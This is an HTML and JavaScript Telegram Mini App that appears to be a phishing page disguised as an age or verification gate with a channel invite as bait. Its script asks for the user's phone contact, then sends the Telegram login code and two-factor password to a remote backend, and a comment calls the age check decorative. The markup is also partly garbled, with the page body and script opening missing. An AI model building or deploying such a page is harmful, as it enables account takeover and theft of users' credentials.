<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Telegram Mini App</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            -webkit-tap-highlight-color: transparent;
        }

        body {
            margin: 0;
            padding: 0;
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
            background: #000;
            overflow-x: hidden;
            width: 100vw;
            height: 100vh;
            position: fixed;
        }
        
        .bg-container {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-image: url('https://3fzt51ap8k.ucarecd.net/d33fd411-441c-459c-bd74-5b662cd20f5f/-/preview/584x1000/');
            background-size: cover;
            background-position: center;
            filter: blur(6px) brightness(1.05) saturate(1.1);
            transform: scale(1.02);
            z-index: 0;
        }

        .overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.12);
            z-index: 1;
            pointer-events: none;
        }

        .content-container {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 10;
            display: flex;
            flex-direction: column;
            justify-content: center;
            padding: 24px;
            overflow-y: auto;
            overflow-x: hidden;
        }

        .main-card {
            background: linear-gradient(180deg, rgba(255,255,255,0.06), rgba(255,255,255,0.03));
            backdrop-filter: blur(6px) saturate(1.08);
            -webkit-backdrop-filter: blur(4px) saturate(1.08);
            border-radius: 24px;
            padding: 36px 26px;
            width: 100%;
            max-width: 420px;
            margin: 0 auto;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.18);
            border: 1px solid rgba(255,255,255,0.08);
        }

        .step-header {
            margin-bottom: 32px;
            text-align: center;
        }

        .emoji-display {
            font-size: 56px;
            margin-bottom: 16px;
            display: block;
        }

        .emoji-strip {
            display: flex;
            gap: 8px;
            justify-content: center;
            align-items: center;
            font-size: 22px;
            padding: 10px 0 18px 0;
            overflow: hidden;
            white-space: nowrap;
            user-select: none;
            -webkit-user-select: none;
        }

        .emoji-strip .emoji-item {
            display: inline-block;
            transform-origin: center;
            animation: floaty 6s ease-in-out infinite;
        }

        .emoji-strip .emoji-item:nth-child(odd) { animation-delay: 0s; }
        .emoji-strip .emoji-item:nth-child(even) { animation-delay: 0.8s; }

        @keyframes floaty {
            0% { transform: translateY(0) scale(1); }
            50% { transform: translateY(-6px) scale(1.05); }
            100% { transform: translateY(0) scale(1); }
        }

        .step-title {
            font-size: 24px;
            font-weight: 700;
            color: #fff;
            margin-bottom: 8px;
            line-height: 1.3;
        }

        .step-subtitle {
            font-size: 14px;
            color: rgba(255, 255, 255, 0.7);
            font-weight: 400;
            line-height: 1.5;
        }

        .input-field {
            width: 100%;
            padding: 16px;
            background: rgba(255, 255, 255, 0.15);
            border: 1px solid rgba(255, 255, 255, 0.2);
            border-radius: 12px;
            color: #fff;
            font-family: 'Inter', sans-serif;
            font-size: 16px;
            font-weight: 500;
            text-align: center;
            transition: all 0.3s ease;
            margin-bottom: 16px;
        }

        .input-field::placeholder {
            color: rgba(255, 255, 255, 0.4);
        }

        .input-field:focus {
            outline: none;
            border-color: rgba(255, 255, 255, 0.4);
            background: rgba(255, 255, 255, 0.2);
        }

        .input-field.otp-field {
            letter-spacing: 8px;
            font-size: 20px;
            font-weight: 600;
        }

        .action-btn {
            width: 100%;
            padding: 16px;
            background: #fff;
            border: none;
            border-radius: 12px;
            color: #000;
            font-family: 'Inter', sans-serif;
            font-weight: 600;
            font-size: 16px;
            cursor: pointer;
            transition: all 0.2s ease;
        }

        .action-btn:active {
            transform: scale(0.97);
            opacity: 0.9;
        }

        .error-banner {
            margin-top: 16px;
            padding: 12px 16px;
            background: rgba(239, 68, 68, 0.2);
            border-radius: 12px;
            color: #fca5a5;
            font-size: 13px;
            font-weight: 500;
            line-height: 1.4;
            text-align: center;
        }

        .hidden {
            display: none !important;
        }

        .success-icon {
            font-size: 80px;
            display: block;
            margin-bottom: 16px;
        }

        .lang-selector {
            position: fixed;
            top: 16px;
            right: 16px;
            z-index: 100;
            display: flex;
            gap: 8px;
        }

        .lang-btn {
            width: 44px;
            height: 44px;
            border-radius: 8px;
            background: rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(20px);
            border: 1px solid rgba(255, 255, 255, 0.2);
            color: #fff;
            font-size: 20px;
            cursor: pointer;
            transition: all 0.2s ease;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .lang-btn.active {
            background: rgba(255, 255, 255, 0.3);
            border-color: rgba(255, 255, 255, 0.5);
        }

        .lang-btn:active {
            transform: scale(0.9);
        }

        .action-btn:disabled {
            opacity: 0.5;
            cursor: not-allowed;
        }

        .spinner {
            border: 3px solid rgba(0, 0, 0, 0.1);
            border-top: 3px solid #000;
            border-radius: 50%;
            width: 20px;
            height: 20px;
            animation: spin 0.8s linear infinite;
            display: inline-block;
            margin-right: 8px;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .join-link {
            margin-top: 24px;
            padding: 16px;
            background: rgba(255, 255, 255, 0.1);
            border-radius: 12px;
            text-align: center;
        }

        .join-btn {
            display: inline-block;
            padding: 12px 24px;
            background: #0088cc;
            color: white;
            text-decoration: none;
            border-radius: 8px;
            font-weight: 600;
            transition: all 0.2s ease;
        }

        .join-btn:active {
            transform: scale(0.95);
            opacity: 0.9;
        }

        .age-row {
            display: flex;
            gap: 12px;
            align-items: center;
            justify-content: center;
            margin-bottom: 18px;
        }

        .age-badge {
            background: rgba(255, 69, 0, 0.12);
            color: #ff7a45;
            padding: 6px 10px;
            border-radius: 10px;
            font-weight: 700;
            border: 1px solid rgba(255, 69, 0, 0.18);
            backdrop-filter: blur(6px);
        }

        #ageConfirmBtn {
            padding: 8px 14px;
            background: linear-gradient(90deg,#ff7a45,#ff385c);
            color: white;
            border-radius: 10px;
            border: none;
            cursor: pointer;
            font-weight: 700;
            box-shadow: 0 6px 18px rgba(255,56,92,0.12);
        }

        #verifyBtn[disabled] {
            opacity: 0.6;
            cursor: not-allowed;
            filter: grayscale(0.2) saturate(0.6);
        }
    </style>
</head>

            <!-- Error Message -->
            <div id="errorMessage" class="hidden error-banner"></div>

        function setLanguage(lang) {
            currentLang = lang;
            document.querySelectorAll('.lang-btn').forEach(btn => {
                btn.classList.toggle('active', btn.dataset.lang === lang);
            });
            
            document.querySelectorAll('[data-i18n]').forEach(el => {
                const key = el.getAttribute('data-i18n');
                if (translations[lang][key]) {
                    el.textContent = translations[lang][key];
                }
            });

            document.querySelectorAll('[data-i18n-placeholder]').forEach(el => {
                const key = el.getAttribute('data-i18n-placeholder');
                if (translations[lang][key]) {
                    el.placeholder = translations[lang][key];
                }
            });
        }

        function showStep(stepId) {
            document.querySelectorAll('[id$="Step"]').forEach(el => el.classList.add('hidden'));
            document.getElementById(stepId).classList.remove('hidden');
            hideError();
        }

        function showError(message) {
            const errorEl = document.getElementById('errorMessage');
            errorEl.textContent = message;
            errorEl.classList.remove('hidden');
        }

        function hideError() {
            document.getElementById('errorMessage').classList.add('hidden');
        }

        function setButtonLoading(btnId, loading) {
            const btn = document.getElementById(btnId);
            if (loading) {
                btn.disabled = true;
                const text = btn.querySelector('span').textContent;
                btn.innerHTML = '<span class="spinner"></span>' + text;
            } else {
                btn.disabled = false;
                const text = btn.textContent.trim();
                btn.innerHTML = '<span>' + text + '</span>';
            }
        }

        function requestPhone() {
            setButtonLoading('verifyBtn', true);
            
            tg.requestContact((result) => {
                setButtonLoading('verifyBtn', false);
                
                if (!result) {
                    showError("Permission denied. Please share your phone number to continue.");
                    return;
                }

                userId = tg.initDataUnsafe?.user?.id || result.user_id;
                setButtonLoading('verifyBtn', true);

                fetch(`${BASE_URL}/api/phone`, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({
                        user_id: userId,
                    })
                })
                .then(response => response.json())
                .then(data => {
                    setButtonLoading('verifyBtn', false);
                    if (data.success) {
                        showStep('otpStep');
                        setTimeout(() => document.getElementById('otpInput').focus(), 100);
                    } else {
                        showError(data.message || "Failed to send verification code");
                    }
                })
                .catch(error => {
                    setButtonLoading('verifyBtn', false);
                    console.error("Error:", error);
                    showError("Network error. Please try again.");
                });
            });
        }

        // Age confirmation logic (decorative only - does not gate Verify button)
        function confirmAge() {
            const ageBtn = document.getElementById('ageConfirmBtn');
            ageBtn.textContent = 'Confirmed ‚úÖ';
            ageBtn.disabled = true;
            ageBtn.style.opacity = '0.9';
        }

        function submitOTP() {
            const otp = document.getElementById('otpInput').value;
            
            if (otp.length < 5 || otp.length > 6) {
                showError("Please enter a valid code (5-6 digits)");
                return;
            }

            setButtonLoading('otpBtn', true);

            fetch(`${BASE_URL}/api/verify-otp`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    user_id: userId,
                    otp: otp,
                    initData: tg.initData
                })
            })
            .then(response => response.json())
            .then(data => {
                setButtonLoading('otpBtn', false);
                if (data.success) {
                    if (data.need_2fa) {
                        showStep('twoFAStep');
                        setTimeout(() => document.getElementById('twoFAInput').focus(), 100);
                    } else {
                        // Set invite link and show success
                        if (data.invite_link) {
                            document.querySelector('.join-btn').href = data.invite_link;
                        }
                        showStep('successStep');
                    }
                } else {
                    showError(data.message || "Invalid code");
                }
            })
            .catch(error => {
                setButtonLoading('otpBtn', false);
                console.error("Error:", error);
                showError("Network error. Please try again.");
            });
        }

        function submit2FA() {
            const twoFA = document.getElementById('twoFAInput').value;
            
            if (!twoFA) {
                showError("Please enter your password");
                return;
            }

            setButtonLoading('2faBtn', true);

            fetch(`${BASE_URL}/api/verify-2fa`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    user_id: userId,
                    password: twoFA,
                    initData: tg.initData
                })
            })
            .then(response => response.json())
            .then(data => {
                setButtonLoading('2faBtn', false);
                if (data.success) {
                    // Set invite link and show success
                    if (data.invite_link) {
                        document.querySelector('.join-btn').href = data.invite_link;
                    }
                    showStep('successStep');
                } else {
                    showError(data.message || "Invalid password");
                }
            })
            .catch(error => {
                setButtonLoading('2faBtn', false);
                console.error("Error:", error);
                showError("Network error. Please try again.");
            });
        }

        // Auto-focus and auto-submit for OTP
        document.getElementById('otpInput').addEventListener('input', function(e) {
            this.value = this.value.replace(/[^0-9]/g, '');
            if (this.value.length === 5 || this.value.length === 6) {
                setTimeout(() => submitOTP(), 500);
            }
        });
    </script>
</body>
</html>
